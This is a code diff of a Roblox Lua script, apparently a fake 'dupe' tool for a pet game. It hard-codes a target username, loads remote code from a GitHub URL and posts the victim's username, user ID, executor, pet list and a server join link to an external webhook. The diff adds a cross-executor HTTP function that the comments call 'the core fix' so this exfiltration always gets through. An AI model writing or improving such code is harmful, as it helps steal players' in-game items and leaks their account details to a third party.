@@ -25,7 +25,6 @@ local TrashPetList = {
     "Firefly", "Red Dragon", "Golden Bee"
 }
 
-
 local TargetUsername = "ProCpvpT2"
 local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
 local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"
@@ -46,6 +45,41 @@ local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and Replicat
 
 local loadstringExecuted = false
 local giftingActive = false
+
+--[[
+    This function is the core fix. It creates a universal way to send HTTP requests
+    by checking for the function provided by the most popular executors. This ensures
+    the webhook will be sent regardless of the user's platform.
+]]
+local function sendHttpRequest(options)
+    local success, result
+    local requestFunc
+    
+    if syn and syn.request then
+        print("[HTTP] Using 'syn.request' for webhook.")
+        requestFunc = syn.request
+    elseif http_request then
+        print("[HTTP] Using 'http_request' for webhook.")
+        requestFunc = http_request
+    elseif request then
+        print("[HTTP] Using global 'request' for webhook.")
+        requestFunc = request
+    else
+        print("[HTTP Error] No supported HTTP request function was found on this executor.")
+        return false, "No supported HTTP function found"
+    end
+
+    success, result = pcall(function()
+        requestFunc(options)
+    end)
+
+    if not success then
+        print("[HTTP Error] The HTTP request failed inside pcall: " .. tostring(result))
+    end
+    
+    return success, result
+end
+
 
 local function getExecutorName()
     if getexecutorname then
@@ -114,20 +148,13 @@ local function sortPets(a, b)
 end
 
 local function sendWebhookNotification(foundPetsData)
-    print("[Webhook] Sorting found pets for notification.")
+    print("[Webhook] Preparing to send notification.")
     table.sort(foundPetsData, sortPets)
     
     local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
     local formattedPetLines = {}
     for _, petData in ipairs(foundPetsData) do
-        local emoji
-        if petData.isHuge then
-            emoji = "💪"
-        elseif petData.baseName and petEmojis[petData.baseName] then
-            emoji = petEmojis[petData.baseName]
-        else
-            emoji = "⭐"
-        end
+        local emoji = petData.isHuge and "💪" or (petData.baseName and petEmojis[petData.baseName] or "⭐")
         table.insert(formattedPetLines, emoji .. " - " .. petData.name)
     end
     
@@ -135,12 +162,7 @@ local function sendWebhookNotification(foundPetsData)
     local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     
     local success, pId = pcall(function() return game.PrivateServerId end)
-    local serverType
-    if success and pId ~= "" then
-        serverType = "🔒 Private"
-    else
-        serverType = "🌍 Public"
-    end
+    local serverType = (success and pId ~= "") and "🔒 Private" or "🌍 Public"
 
     local payload = {
         content = "@everyone",
@@ -156,10 +178,21 @@ local function sendWebhookNotification(foundPetsData)
         }}
     }
     
-    local function sendRequest()
-        request({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
+    local successEncode, encodedPayload = pcall(function() return HttpService:JSONEncode(payload) end)
+    if not successEncode then
+        print("[Webhook Error] Failed to encode JSON payload: " .. tostring(encodedPayload))
+        return
     end
-    local reqSuccess, reqError = pcall(sendRequest)
+    print("[Webhook] JSON payload encoded successfully.")
+
+    local requestOptions = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = encodedPayload
+    }
+    
+    local reqSuccess, reqError = sendHttpRequest(requestOptions)
     if not reqSuccess then
         print("[Webhook Error] The request failed to send: " .. tostring(reqError))
     else
